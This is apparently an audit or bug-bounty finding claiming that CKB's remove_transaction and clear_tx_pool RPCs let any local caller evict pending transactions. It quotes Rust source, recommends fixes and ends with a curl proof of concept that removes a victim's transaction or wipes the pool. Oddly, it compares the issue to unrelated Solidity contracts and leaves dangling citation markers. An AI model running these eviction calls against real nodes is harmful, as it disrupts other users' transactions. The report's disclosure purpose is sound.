### Title
Unrestricted `remove_transaction` and `clear_tx_pool` RPCs Allow Any Local Caller to Evict Legitimate Pending Transactions Without Ownership Check ŌĆö (`rpc/src/module/pool.rs`)

### Summary
The `remove_transaction` and `clear_tx_pool` RPC methods in CKB's Pool module perform no ownership verification and impose no protection on "legitimate" transactions (e.g., already-proposed transactions). Any caller who can reach the JSON-RPC endpoint ŌĆö explicitly an in-scope attacker profile ("supported local CLI/RPC user") ŌĆö can remove any transaction submitted by any user, including transactions already in the `Proposed` state that are about to be committed. This is the direct CKB analog of `recoverERC20()` in `MultiMerkleDistributor.sol`: a function documented as a local admin tool that in practice allows unrestricted removal of all items, including legitimate ones, with no protection mechanism.

### Finding Description

**Root cause ŌĆö no ownership check and no protection for proposed transactions:**

`remove_transaction` in `PoolRpcImpl` passes the caller-supplied hash directly to `remove_local_tx` with zero authorization:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| { ... })
}
``` [1](#0-0) 

`remove_local_tx` dispatches to `remove_tx` in the service layer, which unconditionally removes the transaction from the verify queue, orphan pool, and the main pool map ŌĆö regardless of status:

```rust
pub(crate) async fn remove_tx(&self, tx_hash: Byte32) -> bool {
    let id = ProposalShortId::from_tx_hash(&tx_hash);
    { let mut queue = self.verify_queue.write().await;
      if queue.remove_tx(&id).is_some() { return true; } }
    { let mut orphan = self.orphan.write().await;
      if orphan.remove_orphan_tx(&id).is_some() { return true; } }
    let mut tx_pool = self.tx_pool.write().await;
    tx_pool.remove_tx(&id)
}
``` [2](#0-1) 

`remove_tx` on the pool calls `remove_entry_and_descendants`, which removes the target and all dependent transactions with no status guard: [3](#0-2) 

`clear_tx_pool` is equally unrestricted ŌĆö it wipes the entire pool map, snapshot, and caches in one call:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
``` [4](#0-3) 

The underlying `clear` wipes all entries, edges, links, and counters: [5](#0-4) 

**Contrast with the original report's "protected" pattern:** `QuestBoard.sol` prevents whitelisted tokens from being recovered. CKB has no analogous guard ŌĆö there is no check preventing removal of `Status::Proposed` transactions (transactions already included in a block's proposal list and awaiting commitment), nor any check that the caller is the original submitter.

**Attacker entry path:**

The RPC is bound to `127.0.0.1:8114` by default: [6](#0-5) 

The Pool module is enabled by default in the standard configuration: [7](#0-6) 

No authentication is enforced at the RPC server level for these methods. Any process on the same host ŌĆö a co-located web service, a malicious script, or a second user on a shared node ŌĆö can issue:

```json
{"jsonrpc":"2.0","method":"remove_transaction","params":["<victim_tx_hash>"],"id":1}
```

or

```json
{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}
```

and the node will comply unconditionally.

### Impact Explanation

1. **Targeted transaction eviction:** A local RPC caller can remove any specific pending or proposed transaction submitted by any other user or application sharing the node. In CKB's two-phase commit model, a `Proposed` transaction that is evicted from the local pool will not be included in the local miner's next block template, causing the local miner to forfeit the associated transaction fee and forcing the original submitter to resubmit.

2. **Full pool wipe:** `clear_tx_pool` removes all pending and proposed transactions simultaneously. For a mining node, this means the block assembler is reset and all queued fee-bearing transactions are lost from the local pool. Users who submitted transactions to this node must resubmit.

3. **Cascading removal:** `remove_entry_and_descendants` removes not only the targeted transaction but all transactions that depend on it (child transactions), amplifying the impact of a single call. [8](#0-7) 

### Likelihood Explanation

The attacker profile "supported local CLI/RPC user" is explicitly in scope. In practice:
- Shared infrastructure (e.g., a node-as-a-service provider, a development environment with multiple users) exposes the RPC to multiple local principals.
- Any co-located process (web server, monitoring agent, malicious dependency) can reach `127.0.0.1:8114` without any credential.
- The RPC is enabled and the Pool module is on by default; no special configuration is required.

### Recommendation

1. **Protect proposed transactions:** Add a status guard in `remove_tx` that rejects removal of transactions with `Status::Proposed`, mirroring the `whitelistedTokens` check in `QuestBoard.sol`.
2. **Ownership tracking:** Record the submitter identity (e.g., a session token or local process ID) at submission time and verify it on removal.
3. **Restrict `clear_tx_pool`:** Limit it to `Status::Pending` and `Status::Gap` entries only, preserving already-proposed transactions.
4. **Authentication layer:** Add optional HTTP Basic Auth or token-based authentication to the RPC server for state-mutating Pool methods.

### Proof of Concept

```bash
# Step 1: User A submits a legitimate transaction
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"send_transaction","params":[<tx_A_json>,"passthrough"],"id":1}'
# Returns: {"result":"0xABCD..."}  <- tx_hash

# Step 2: Attacker (any local process) removes User A's transaction
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"remove_transaction","params":["0xABCD..."],"id":2}'
# Returns: {"result":true}  <- tx evicted, no auth required

# Step 3: Verify pool is empty
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"tx_pool_info","params":[],"id":3}'
# Returns: {"result":{"pending":"0x0",...}}

# Alternatively, wipe the entire pool:
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":4}'
# Returns: {"result":null}  <- all transactions evicted
```
